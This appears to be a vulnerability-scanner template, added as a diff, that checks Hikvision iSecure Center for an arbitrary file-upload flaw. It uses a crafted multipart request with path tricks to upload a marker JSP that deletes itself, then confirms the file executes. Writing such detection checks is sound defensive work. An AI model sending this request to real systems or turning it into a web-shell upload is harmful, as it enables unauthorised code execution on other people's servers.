@@ -1,0 +1,30 @@
+name: hikvision-iSecure-Cente-clusters-fileupload
+set:
+    randbody: randomLowercase(32)
+    randstr: randomLowercase(10)
+rules:
+  - method: POST
+    path: "/clusterMgr/clusters/ssl/file;.js"
+    headers:
+      Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
+    body: "\
+      ----------------------------984514492333278399715408\r\n\
+      Content-Disposition: form-data; name=\"file\"; filename=\"languages/{{randstr}}.jsp\"\r\n\
+      Content-Type: image/png\r\n\
+      \r\n\
+      <% out.println({{randbody}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+      ----------------------------984514492333278399715408\r\n\
+      Content-Disposition: form-data; name=\"proxyAddress\"\r\n\
+      \r\n\
+      8.8.8.8\r\n\
+      ----------------------------984514492333278399715408--
+      "
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/clusterMgr/languages/{{randstr}}.jsp;.js"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes({{randbody}}))
+    
+detail:
+  author: fliggy
